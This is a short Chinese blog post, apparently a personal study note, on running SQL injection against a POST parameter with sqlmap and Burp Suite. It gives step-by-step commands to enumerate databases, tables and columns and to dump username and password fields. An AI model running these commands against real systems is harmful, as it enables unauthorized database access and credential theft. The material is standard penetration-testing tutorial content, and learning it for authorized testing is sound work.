记录用sqlmap进行数据库爆破（1）

发表于 2019-11-08

记录一下sqlmap针对post传参进行sql注入的方法（基础）
1.首先用burp suite进行抓包，后保存抓取到的内容，命名为post.txt存放在一个目录下
2.首先列数据库(爆破数据库名);python2 sqlmap.py -r “post.txt” –dbs -r:表示加载一个文件
其中出现了三次提示:

it looks like the ##### DBMS is ‘MySQL’. Do you want to skip test payloads specific for other DBMSes? [Y/n]
它看起来像后端DBMS是’MySQL’。 是否要跳过特定于其他DBMS的测试负载？ [Y/n] 输入”Y”

for the remaining tests, do you want to include all tests for ‘MySQL’ extending provided level (1) and risk (1) values? [Y/n]
对于剩余的测试，您想要包括所有针对“MySQL”扩展提供的级别（1）和风险（1）值的测试吗？ [Y/n] 输入”N”

POST parameter ‘n’ is vulnerable. Do you want to keep testing the others (if any)? [y/N]
POST参数’n’是脆弱的。 你想继续测试其他人（如果有的话）吗？[y/N] 输入”Y”
3.爆破表名（选择一个合适的数据库进行爆破）：python2 sqlmap.py -r “post.txt” -D xxx –tables
4.爆破列名：python2 sqlmap.py -r “post.txt” -D xxxx -T user –columns
5.爆破列的内容：python2 sqlmap.py -r “post.txt” -D xxx -T user -C “username,password” –dump

-D：数据库名 -T：表名 -C:字段名 –dump：脱裤
